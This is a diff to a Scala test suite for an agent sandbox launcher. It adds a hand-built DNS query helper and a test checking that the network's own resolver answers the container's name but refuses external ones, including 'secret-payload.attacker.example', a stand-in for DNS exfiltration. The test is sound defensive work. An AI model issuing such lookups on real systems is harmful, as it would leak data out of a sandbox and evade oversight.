@@ -7,6 +7,8 @@
 //
 // The network checks drive `curl` and `getent` as processes rather than Java's own HTTP and TLS:
 // the proxy meets those clients in practice, and a JDK client would be testing a different one.
+// The one exception is the query to the network's own resolver: no program in the image sends a
+// DNS query to a chosen server.
 
 package agentsandbox.launcher
 
@@ -59,6 +61,20 @@ class SessionBoundaryTest extends munit.FunSuite:
       refusal.getMessage.contains("Operation not permitted"),
       s"$what failed with '${refusal.getMessage}', but not as a policy denial (EPERM)",
     )
+
+  /** One DNS A query over UDP, answered as (response code, answer count). */
+  private def queryA(server: java.net.InetAddress, name: String): (Int, Int) =
+    val header = Array[Byte](0x12, 0x34, 0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0) // recursion desired, one question
+    val labels = name.split('.').flatMap(label => label.length.toByte +: label.getBytes(StandardCharsets.US_ASCII))
+    val query = header ++ labels ++ Array[Byte](0, 0, 1, 0, 1) // root, type A, class IN
+    val socket = java.net.DatagramSocket()
+    try
+      socket.setSoTimeout(5000)
+      socket.send(java.net.DatagramPacket(query, query.length, server, 53))
+      val response = new Array[Byte](512)
+      socket.receive(java.net.DatagramPacket(response, response.length))
+      (response(3) & 0x0f, (response(6) & 0xff) << 8 | response(7) & 0xff)
+    finally socket.close()
 
   private def procLines(path: String): Vector[String] =
     Files.readAllLines(Paths.get(path)).asScala.toVector
@@ -142,7 +158,26 @@ class SessionBoundaryTest extends munit.FunSuite:
     assertEquals(reached, "Network is unreachable")
 
     Vector("example.com", "secret-payload.attacker.example").foreach: name =>
-      assert(!run("getent", "hosts", name).ok, s"$name resolved; a resolver is reachable")
+      assert(!run("getent", "hosts", name).ok, s"$name resolved through the resolvers resolv.conf names")
+
+  test("the network's own resolver answers the run's names and no external one"):
+    inSession()
+    // getent never asks this resolver: resolv.conf does not name it. The on-link route is the
+    // network, in little-endian hex; the resolver listens on its first address.
+    val network = procLines("/proc/net/route").drop(1).map(_.split("\\s+")(1)).find(_ != "00000000")
+      .getOrElse(fail("no on-link route"))
+    val firstAddress = Integer.reverseBytes(Integer.parseUnsignedInt(network, 16)) + 1
+    val resolver = java.net.InetAddress.getByAddress(java.nio.ByteBuffer.allocate(4).putInt(firstAddress).array())
+
+    // The run's own name must resolve, so the NXDOMAIN answers below come from the network's name
+    // service rather than from another listener at that address.
+    val ownName = Files.readString(Paths.get("/etc/hostname")).trim
+    val (ownCode, ownAnswers) = queryA(resolver, ownName)
+    assert(ownCode == 0 && ownAnswers > 0, s"$resolver does not answer this container's name")
+
+    // example.com exists, so a resolver that forwarded it would answer.
+    Vector("example.com", "secret-payload.attacker.example").foreach: name =>
+      assertEquals(queryA(resolver, name), (3, 0), s"$resolver did not answer NXDOMAIN for $name")
 
   test("the CONNECT checks refuse everything but a listed host on 443"):
     inSession()
